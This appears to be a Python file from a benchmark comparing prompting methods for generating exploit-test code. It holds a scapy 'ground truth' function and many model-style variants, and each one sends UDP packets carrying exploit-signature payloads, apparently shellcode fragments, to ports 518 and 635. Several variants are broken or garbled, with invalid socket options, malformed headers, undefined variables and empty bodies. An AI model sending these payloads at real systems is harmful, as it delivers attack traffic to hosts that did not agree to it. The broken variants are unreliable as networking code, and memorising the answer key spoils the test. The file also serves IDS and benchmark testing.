from scapy.all import *
import ipaddress
import warnings
from ipaddress import *
import re


def ground_truth_code_exploitTest(src, dst, iface, count):
    
    pkt = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load=b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
    send(pkt, iface=iface, count=count)
    
    pkt = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load=b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    send(pkt, iface=iface, count=count)

def persona_exploitTest(src, dst, iface, count):
    import socket
    import struct
    udp_packet = struct.pack('!HH', 518, 0)
    load1 = b'\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8'
    load2 = b'^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F'
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((src, 0))
    sock.sendto(udp_packet + load1, (dst, 518))
    sock.sendto(udp_packet + load2, (dst, 635))
    sock.close()

def template_exploitTest(src, dst, iface, count):
    import socket
    import struct
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
    iface = socket.if_nametoindex(iface)
    sock.bind((dst, 0))
    udp_header = struct.pack('!HHHH', 518, 0, 0, 0)
    ip_header = struct.pack('!BBHHHBBH4s4s', 192, 168, 1, 518, 0, 0x28, 0, 0, src.encode('utf-8'), dst.encode('utf-8'))
    load_udp518 = b'\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8'
    load_udp635 = b'^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F'
    try:
        sock.sendto(socket.inet_aton(src)+udp_header+load_udp518, (dst, 518))
        sock.sendto(socket.inet_aton(src)+ip_header+load_udp635, (dst, 635))
    except socket.error as e:
        print(f'Failed to send packet: {e}')

def question_refinement_exploitTest(src, dest, udp_dst_port, data):
    packet = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
    packet.setsockopt(socket.IP_HDRLEN, socket.getprotobyname('ipv4'))
    source_ip = socket.inet_aton(src)
    dest_ip = socket.inet_aton(dest)
    packet.setsockopt(socket.IP_SRC, source_ip)
    packet.setsockopt(socket.IP_TOS, 0)
    packet.setsockopt(socket.IP_FIN, 1)
    packet.setsockopt(socket.IP_RECVERR, 1)
    packet.setsockopt(socket.IP_RCVALL, 1)
    payload = socket.inet_aton(dest) + bytes(payload_data, 'utf-8')
    packet.sendto(payload)

def alternative_approaches_exploitTest(src, dst, iface, count):
    from scapy.all import UDP, IP, sendp
    pkt = IP(src=src, dst=dst)/UDP(dport=518)/"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8"
    sendp(pkt, iface=iface)
    pkt = IP(src=src, dst=dst)/UDP(dport=635)/"\x5c\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F"
    sendp(pkt, iface=iface)

def context_manager_exploitTest(src, dst, iface, count):
    import socket
    import struct
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
    sock.setsockopt(socket.SOL_IP, socket.IP_SEGMENT_DONTFRAG, 0)
    packet = struct.pack('!BBHHHBBH4s', 61, 0, 518, 0, 64, 0, 0, b'\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
    packet += struct.pack('!BBHHH', 63, 0, count, 0, 4)
    packet += struct.pack('!6s6sH', dst[0].encode('utf-8'), src[0].encode('utf-8'), 20)
    sock.sendto(packet, (dst[0], count))
    iface.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, iface.encode('utf-8'))
    sock.close()

def iterative_prompting_3_exploitTest(src, dst, iface, count):
    import socket
    import struct
    import socket
    if not isinstance(src, str):
        raise ValueError("Source must be a string representing the source address")
    if not isinstance(dst, str):
        raise ValueError("Destination must be a string representing the destination address")
    if not isinstance(iface, str):
        raise ValueError("Interface must be a string representing the network interface")
    if not isinstance(count, int) or count <= 0:
        raise ValueError("Count must be a positive integer")
    try:
        load1 = b'\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8'
        load2 = b'^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F'
        udp_sock1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_sock1.bind((iface, 0))
        addr1 = udp_sock1.getsockname()
        udp_sock1.connect((dst, 518))
        udp_sock1.send(src + struct.pack('B', len(load1)) + load1)
        udp_sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_sock2.bind((iface, 0))
        addr2 = udp_sock2.getsockname()
        udp_sock2.connect((dst, 635))
        udp_sock2.send(src + struct.pack('B', len(load2)) + load2)
    except socket.error as e:
        print(f"A socket error occurred: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

def iterative_prompting_4_exploitTest(src, dst, iface, count):
    import socket
    import sys
    if sys.version_info < (3, 7):
        raise ImportError()

def iterative_prompting_5_exploitTest(src, dst, iface, count):
    import socket
    from scapy.all import UDP, Ether, load
    import re
    if not isinstance(src, str) or not isinstance(dst, str) or not isinstance(iface, str) or not isinstance(count, int):
        raise ValueError("Invalid input parameters. 'src', 'dst', and 'iface' should be strings, 'count' should be an integer.")
    ip_pattern = r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$'
    if not re.match(ip_pattern, src) or not re.match(ip_pattern, dst):
        raise ValueError("Invalid IP address(es). The format should be 'xxx.xxx.xxx.xxx'.")
    safe_load = lambda payload: all(ord(c) < 128 for c in payload)
    payload1 = '\\x01\\x03\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x02\\x02\\xE8'
    if not safe_load(payload1):
        raise ValueError("Payload for packet1 contains disallowed characters.")
    payload2 = '^\\xB0\\x02\\x89\\x06\\xFE\\xC8\\x89F\\x04\\xB0\\x06\\x89F'
    if not safe_load(payload2):
        raise ValueError("Payload for packet2 contains disallowed characters.")
    pass

def few_shots_prompting_exploitTest(src, dst, iface, count):
    pkt = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load='\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
    send(pkt, iface=iface, count=count)
    pkt = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load='^\xB0\x02\x89\x06\xFE\xc8\x89F\x04\xB0\x06\x89F')
    send(pkt, iface=iface, count=count)

def cot_prompting_exploitTest(src, dst, iface, count):
    pkt = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load='\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
    send(pkt, iface=iface, count=count)
    pkt = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load='^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F')
    send(pkt, iface=iface, count=count)

import socket
def fact_check_list_exploitTest(src, dst, iface, count):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        if iface:
            sock.bind((iface, 0))
        sock.sendto(load, (dst, dst_port))
        load1 = b'\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8'
        load2 = b'^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F'

import socket
from scapy.all import IP, UDP, Raw
def not_interactive_mix_exploitTest(src, dst, iface, count):
    try:
        pkt_518 = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load="")
    except: pass

def baseline_exploitTest(src, dst, iface, count):
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind((iface, 0))
    addr = s.getsockname()
    s.sendto(b'\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xe8', (dst, 518))
    packed_load = b'^\xb0\x02\x89\x06\xfe\xc8\x89F\x04\xb0\x06\x89F'
    s.sendto(packed_load, (dst, 635))

